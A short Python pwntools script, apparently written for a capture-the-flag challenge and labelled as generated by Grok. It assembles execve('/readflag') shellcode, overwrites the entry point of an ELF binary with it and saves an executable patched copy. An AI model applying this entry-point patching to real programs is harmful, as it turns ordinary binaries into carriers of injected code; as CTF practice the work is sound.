# This code is generated by grok
# Please run patchelf scripts before running this
from pwn import *

# Set context for 64-bit architecture
context.arch = 'amd64'
context.os = 'linux'

# Load the ELF binary
elf = context.binary = ELF('./exp')

# Get the entry point address
entry_addr = elf.entry
log.info(f"Original entry point: {hex(entry_addr)}")

# Craft shellcode for execve("/readflag", NULL, NULL)
# shellcraft.syscall('execve', '/readflag', 0, 0) generates the syscall
shellcode = asm(shellcraft.execve('/readflag', 0, 0))

# Check shellcode length
log.info(f"Shellcode length: {len(shellcode)} bytes")
if len(shellcode) > 50:
    log.warning("Shellcode may be too large for entry point. Adjust or verify space.")

# Read the original code at the entry point (for reference)
original_code = elf.read(entry_addr, len(shellcode))
log.info(f"Original code at entry point: {original_code.hex()}")

# Patch the entry point with the shellcode
elf.write(entry_addr, shellcode)

# Save the modified binary
output_path = './exp_patched'
elf.save(output_path)
log.success(f"Patched binary saved as: {output_path}")

# Set executable permissions on the output file
import os
os.chmod(output_path, 0o755)
log.info(f"Set executable permissions on {output_path}")
